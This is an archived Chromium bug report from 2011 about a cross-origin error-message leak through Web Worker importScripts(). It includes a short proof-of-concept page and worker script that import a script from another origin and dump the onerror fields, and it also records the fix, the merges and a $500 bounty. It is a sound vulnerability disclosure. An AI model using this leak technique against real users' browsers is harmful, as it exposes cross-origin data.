# Cross-origin Javascript error message leak via Worker importScripts()

| Field | Value |
|-------|-------|
| **Issue ID** | [40087103](https://issues.chromium.org/issues/40087103) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink |
| **Reporter** | sc...@gmail.com |
| **Assignee** | le...@chromium.org |
| **Created** | 2011-01-21 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

Splitting out from <http://code.google.com/p/chromium/issues/detail?id=69187>  

Credit to divricean (cc:ed)

## Here is the repro from the other bug:

Here's another thought on how to get the error message with or without overriding ReferenceError. These should also be checked.

<html><head>
<script type="text/javascript">

var worker = new Worker("worker.js");  

worker.onmessage = function(e){ alert(e.data) };  

worker.onerror = function(e){ var msg = "", j; for (j in e) { msg += j+':'+e[j]+"\n";} alert(msg); };

</script></head><body></body></html>

## --worker.js-- /\*ReferenceError.prototype.**defineGetter**('name', function(){ var msg = "", e=this, j; for (j in e) { if(j!='name') msg += j+':'+e[j]+"\n";} postMessage(msg); });\*/ importScripts("<http://jsbin.com/afugi4/2>");

Interestingly, new Worker() has to load scripts from the same origin, but there is no such restriction in importScripts(). Hence the leak via the worker.onerror method.

I've hosted an online demo: <http://cevans-app.appspot.com/static/workeronerror.html>

(Note that this demo uses some redirectors to try and confuse any origin check we might add, so it'll be a good test case to make sure we get redirects correct).

The standard "fix" here is to have the onerror handler report simply, "error", with no further details, if the error came from a script loaded cross-origin.

**VERSION**  

Chrome Version: Everything (Chrome 8 stable, Chrome 9 beta, dev channel, trunk, ...)  

Operating System: All (mine: Linux x86\_64, Ubuntu 10.04)

**REPRODUCTION CASE**  

See above.

## Timeline

### sc...@gmail.com (2011-01-21)

+abarth for comment on whether importScripts() is supposed to be locked to same origin, or open to anything. (My guess is maybe the latter, it seems conceptually similar to <script src=""> in normal HTML).

### sc...@gmail.com (2011-01-21)

@levin: hello sir! Who should fix this security bug? We intent to include the fix in the first post-M9 patch (to go along with another similar issue).

### sc...@gmail.com (2011-01-23)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-01-23)

WebKit bug: https://bugs.webkit.org/show_bug.cgi?id=52192

### di...@gmail.com (2011-01-23)

@scarybeasts: Possibly a wrong link in https://crbug.com/chromium/70336#c4?

### sc...@gmail.com (2011-01-23)

Oops! Yeah, WebKit bug: https://bugs.webkit.org/show_bug.cgi?id=52871 :)

### sc...@gmail.com (2011-02-02)

Ping? We're looking to put together a patch in a week, and it's preferable to have changes "baked" on trunk for a few days.

### le...@chromium.org (2011-02-02)

This needs the same fix as https://bugs.webkit.org/show_bug.cgi?id=52192 which is a v8 change. (I found the corresponding Chrome bug so I'll resolve this as a dup. I'll do the same on the WebKit side.)




### sc...@gmail.com (2011-02-02)

Are you sure? I have a build with all Mads' latest v8 fixes in it, and this bug still reproduces. Re-opening whilst we investigate. We don't want a security fix to slip through the cracks.


### le...@chromium.org (2011-02-02)

ok, it looks like we need to modify WorkerContext::reportException in a similar way to http://trac.webkit.org/changeset/76429.

I'll probably generalize that code a bit so I can use it from this place to sanitizer the error message in the same way for both locations.


### sc...@gmail.com (2011-02-04)

Committed as http://trac.webkit.org/changeset/77563

We will merge to M9, M10.

### sc...@gmail.com (2011-02-04)

@divricean: still playing along? :)
This bug is in a very different area to the other error-override based problems. Therefore, the rewards panel decided this qualifies for an additional $500. Congrats!

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### di...@gmail.com (2011-02-04)

Thanks! Yes, still playing, trying my best to do my worst :)

### sc...@gmail.com (2011-02-14)

Actually, we will just merge this to M10 since it's relatively close.

Maybe Inferno can be persuaded to do his WebKit merge magic?

### in...@chromium.org (2011-02-14)

Magic done!! merged to m10 in r78485.

### sc...@gmail.com (2011-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-03-15)

Invoice finalized; payment is in e-payment system.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/70336?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40087103)*
